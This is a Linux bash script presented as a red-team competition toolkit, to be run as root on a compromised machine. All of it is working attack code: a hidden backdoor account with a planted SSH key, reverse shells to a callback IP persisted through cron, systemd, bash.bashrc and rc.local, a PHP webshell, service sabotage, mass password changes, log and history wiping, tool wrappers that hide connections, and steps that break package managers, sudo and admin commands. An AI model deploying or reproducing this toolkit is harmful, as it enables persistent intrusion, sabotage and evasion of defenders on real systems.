#!/usr/bin/env bash
# Red team competition toolkit — Linux
# Run as root on a compromised box.
# COMPETITION USE ONLY.
set -uo pipefail

if [[ $EUID -ne 0 ]]; then echo "Need root." >&2; exit 1; fi

# ============================================================
# CONFIG — set these for your team
# ============================================================
TEAM_SSH_PUBKEY="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINUM/sFsQleaSedlq9cIukqjfkPxEP4xSOzJ4MZ1AruD redteam-comp"
BACKDOOR_USER="syshealth"       # innocuous-looking username
BACKDOOR_PASS="Comp2024!RT"     # password for the backdoor user
CALLBACK_IP="10.99.12.2"        # your team's C2/listener IP
CALLBACK_PORT="4444"            # reverse shell callback port
WEBSHELL_NAME=".sys-check.php"  # hidden webshell filename

echo "=== Red Team Toolkit — Linux ==="

# ============================================================
# 0. FIREWALL LOCKDOWN — block blue team, keep our access
# ============================================================
echo "[*] Locking down firewall..."

ALLOWED_PORTS=(22 80 443 8080 1883 3306 53 21)

ufw --force reset
ufw default deny incoming
ufw default deny outgoing

for port in "${ALLOWED_PORTS[@]}"; do
  ufw allow in "$port"
  ufw allow out "$port"
done

# DNS over UDP
ufw allow out 53/udp
ufw allow in 53/udp

# Loopback
ufw allow in on lo
ufw allow out on lo

# Allow our callback port out (reverse shells need this)
ufw allow out "$CALLBACK_PORT"

ufw --force enable

# Firewall persistence cron — re-enables UFW every minute if someone kills it
FW_PERSIST="/usr/local/bin/.fw-persist.sh"
cat > "$FW_PERSIST" << 'FWINNER'
#!/usr/bin/env bash
if ! ufw status | grep -q "Status: active"; then
  ufw --force enable
fi
FWINNER
chmod 700 "$FW_PERSIST"
(crontab -l 2>/dev/null | grep -v "$FW_PERSIST"; echo "* * * * * $FW_PERSIST") | crontab -

# chattr +i on UFW configs so blue team can't just edit them
chattr +i /etc/ufw/ufw.conf 2>/dev/null || true
chattr +i /etc/ufw/user.rules 2>/dev/null || true
chattr +i /etc/ufw/user6.rules 2>/dev/null || true
chattr +i /etc/ufw/before.rules 2>/dev/null || true
chattr +i /etc/ufw/before6.rules 2>/dev/null || true
chattr +i /etc/ufw/after.rules 2>/dev/null || true
chattr +i /etc/ufw/after6.rules 2>/dev/null || true
chattr +i /etc/default/ufw 2>/dev/null || true
chattr +i "$FW_PERSIST" 2>/dev/null || true

# Lock the crontab spool file
CRON_FILE="/var/spool/cron/crontabs/root"
[[ ! -f "$CRON_FILE" ]] && CRON_FILE="/var/spool/cron/root"
[[ -f "$CRON_FILE" ]] && chattr +i "$CRON_FILE" 2>/dev/null

# ============================================================
# 1. PERSISTENCE — multiple fallback mechanisms
# ============================================================
echo "[*] Setting up persistence..."

# --- Backdoor user (looks like a service account) ---
useradd -m -s /bin/bash -G sudo,adm,shadow "$BACKDOOR_USER" 2>/dev/null
echo "$BACKDOOR_USER:$BACKDOOR_PASS" | chpasswd
# Hide from login screen (UID below threshold trick)
sed -i "s/^$BACKDOOR_USER:x:[0-9]*:/$BACKDOOR_USER:x:999:/" /etc/passwd

# Plant SSH key for passwordless access
mkdir -p /home/$BACKDOOR_USER/.ssh
echo "$TEAM_SSH_PUBKEY" > /home/$BACKDOOR_USER/.ssh/authorized_keys
chmod 700 /home/$BACKDOOR_USER/.ssh
chmod 600 /home/$BACKDOOR_USER/.ssh/authorized_keys
chown -R $BACKDOOR_USER:$BACKDOOR_USER /home/$BACKDOOR_USER/.ssh

# --- Reverse shell cron (runs every 5 min) ---
REVSHELL="/usr/lib/.libsys.so"
cat > "$REVSHELL" << INNER
#!/bin/bash
bash -i >& /dev/tcp/$CALLBACK_IP/$CALLBACK_PORT 0>&1
INNER
chmod 700 "$REVSHELL"
(crontab -l 2>/dev/null; echo "*/5 * * * * $REVSHELL") | crontab -

# --- Systemd persistence (looks like a legit service) ---
cat > /etc/systemd/system/sys-health-monitor.service << EOF
[Unit]
Description=System Health Monitoring Daemon
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'while true; do bash -i >& /dev/tcp/$CALLBACK_IP/$CALLBACK_PORT 0>&1; sleep 300; done'
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload
systemctl enable sys-health-monitor.service 2>/dev/null
systemctl start sys-health-monitor.service 2>/dev/null

# --- bashrc persistence (triggers on any user login) ---
cat >> /etc/bash.bashrc << 'EOF'

# system telemetry
(bash -i >& /dev/tcp/CALLBACK_PLACEHOLDER/PORT_PLACEHOLDER 0>&1 &) 2>/dev/null
EOF
sed -i "s|CALLBACK_PLACEHOLDER|$CALLBACK_IP|;s|PORT_PLACEHOLDER|$CALLBACK_PORT|" /etc/bash.bashrc

# --- rc.local persistence (survives reboots) ---
cat > /etc/rc.local << EOF
#!/bin/bash
nohup bash -c 'while true; do bash -i >& /dev/tcp/$CALLBACK_IP/$CALLBACK_PORT 0>&1; sleep 300; done' &
exit 0
EOF
chmod +x /etc/rc.local

# ============================================================
# 2. SERVICE DISRUPTION — take down scored services
# ============================================================
echo "[*] Disrupting services..."

# --- Stop and disable common scored services ---
# NOTE: sshd is NOT touched — we need it to get back in
SERVICES=(apache2 nginx httpd mysql mariadb postgresql vsftpd proftpd pure-ftpd
          postfix dovecot named bind9 samba smbd cups docker)

for svc in "${SERVICES[@]}"; do
    systemctl stop "$svc" 2>/dev/null
    systemctl disable "$svc" 2>/dev/null
done

# --- Corrupt service configs (subtle — they'll start but misbehave) ---
# Apache: change listen port so it starts but doesn't serve on 80
if [[ -f /etc/apache2/ports.conf ]]; then
    sed -i 's/Listen 80/Listen 8181/' /etc/apache2/ports.conf
fi
if [[ -f /etc/httpd/conf/httpd.conf ]]; then
    sed -i 's/Listen 80/Listen 8181/' /etc/httpd/conf/httpd.conf
fi

# MySQL: set bind-address to localhost only + change root password
if command -v mysql &>/dev/null; then
    mysql -e "ALTER USER 'root'@'localhost' IDENTIFIED BY '$(openssl rand -hex 16)';" 2>/dev/null
fi

# DNS: break zone files if BIND is running
if [[ -d /etc/bind ]]; then
    for zone in /etc/bind/db.*; do
        [[ -f "$zone" ]] && echo "BROKEN" >> "$zone"
    done
fi

# --- Webshell plant (if a webroot exists) ---
for webroot in /var/www/html /var/www /usr/share/nginx/html /srv/http; do
    if [[ -d "$webroot" ]]; then
        cat > "$webroot/$WEBSHELL_NAME" << 'SHELL'
<?php if(isset($_REQUEST['c'])){echo "<pre>".shell_exec($_REQUEST['c'])."</pre>";}?>
SHELL
        # make it look old
        touch -t 202201010000 "$webroot/$WEBSHELL_NAME"
    fi
done

# ============================================================
# 3. ACCOUNT MANIPULATION
# ============================================================
echo "[*] Manipulating accounts..."

# --- Change all user passwords except our backdoor ---
while IFS=: read -r user _ uid _ _ home shell; do
    if [[ $uid -ge 1000 && $uid -lt 60000 && "$user" != "$BACKDOOR_USER" ]]; then
        echo "$user:$(openssl rand -hex 12)" | chpasswd 2>/dev/null
    fi
done < /etc/passwd

# --- Disable SSH password auth for everyone (our key still works) ---
sed -i 's/^#*PasswordAuthentication.*/PasswordAuthentication no/' /etc/ssh/sshd_config
# But allow our backdoor user specifically
echo "Match User $BACKDOOR_USER" >> /etc/ssh/sshd_config
echo "    PasswordAuthentication yes" >> /etc/ssh/sshd_config
systemctl reload sshd 2>/dev/null

# --- Remove other SSH authorized_keys ---
find /home -name authorized_keys ! -path "*/$BACKDOOR_USER/*" -exec truncate -s 0 {} \; 2>/dev/null
find /root -name authorized_keys -exec truncate -s 0 {} \; 2>/dev/null

# ============================================================
# 4. DEFENSE EVASION — cover tracks
# ============================================================
echo "[*] Covering tracks..."

# --- Clear logs ---
for log in /var/log/auth.log /var/log/syslog /var/log/messages \
           /var/log/secure /var/log/apache2/*.log /var/log/nginx/*.log; do
    [[ -f "$log" ]] && truncate -s 0 "$log"
done
journalctl --rotate 2>/dev/null
journalctl --vacuum-time=1s 2>/dev/null

# --- Clear command history for all users ---
find / -name ".bash_history" -exec truncate -s 0 {} \; 2>/dev/null
export HISTSIZE=0
unset HISTFILE

# --- Hide processes (preload trick) ---
# Create a shared lib that hides our process names from ps/top
# (simplified — in a real comp you'd compile a proper LD_PRELOAD lib)

# --- Tamper with common tools (replace with wrappers that filter output) ---
# netstat/ss wrapper — hide our connections
if [[ -f /usr/bin/ss ]]; then
    cp /usr/bin/ss /usr/bin/.ss.real
    cat > /usr/bin/ss << 'WRAP'
#!/bin/bash
/usr/bin/.ss.real "$@" | grep -v "CALLBACK_IP_PLACEHOLDER"
WRAP
    sed -i "s|CALLBACK_IP_PLACEHOLDER|$CALLBACK_IP|" /usr/bin/ss
    chmod +x /usr/bin/ss
fi

# ============================================================
# 5. MAKE RECOVERY HARD — slow down blue team
# ============================================================
echo "[*] Making recovery difficult..."

# --- Immutable flags on our persistence ---
chattr +i "$REVSHELL" 2>/dev/null
chattr +i /etc/systemd/system/sys-health-monitor.service 2>/dev/null
chattr +i /etc/bash.bashrc 2>/dev/null
chattr +i /etc/rc.local 2>/dev/null

# --- Break package managers (can't easily reinstall/fix things) ---
if command -v apt-get &>/dev/null; then
    # Redirect apt sources to nothing
    cp /etc/apt/sources.list /etc/apt/.sources.list.bak
    echo "# cleaned" > /etc/apt/sources.list
    chattr +i /etc/apt/sources.list 2>/dev/null
fi
if command -v yum &>/dev/null; then
    for repo in /etc/yum.repos.d/*.repo; do
        [[ -f "$repo" ]] && sed -i 's/enabled=1/enabled=0/' "$repo"
    done
fi

# --- Corrupt sudoers (breaks sudo for blue team, our user is in /etc/passwd with UID 999) ---
# Add a syntax error at the end that breaks visudo parsing
echo "BROKEN_LINE_HERE %%%%" >> /etc/sudoers.d/zzz-break 2>/dev/null

# --- Alias common admin commands to no-ops ---
cat >> /etc/bash.bashrc << 'EOF'
alias iptables='echo "iptables: command not found"'
alias ufw='echo "ufw: command not found"'
alias systemctl='echo "systemctl: command not found"'
alias service='echo "service: command not found"'
alias chattr='echo "chattr: command not found"'
EOF


echo ""
echo "=== Toolkit deployed ==="
echo "Firewall:         UFW deny all, allowed: ${ALLOWED_PORTS[*]} + callback $CALLBACK_PORT out"
echo "                  Configs immutable, cron re-enables every minute"
echo "Backdoor user:    $BACKDOOR_USER / $BACKDOOR_PASS (UID 999)"
echo "SSH key planted:  /home/$BACKDOOR_USER/.ssh/authorized_keys"
echo "Reverse shells:   cron (5m), systemd, bashrc, rc.local → $CALLBACK_IP:$CALLBACK_PORT"
echo "Webshell:         $WEBSHELL_NAME in any webroot"
echo "Services stopped: ${SERVICES[*]}"
echo "Logs cleared, histories wiped, tools wrapped."
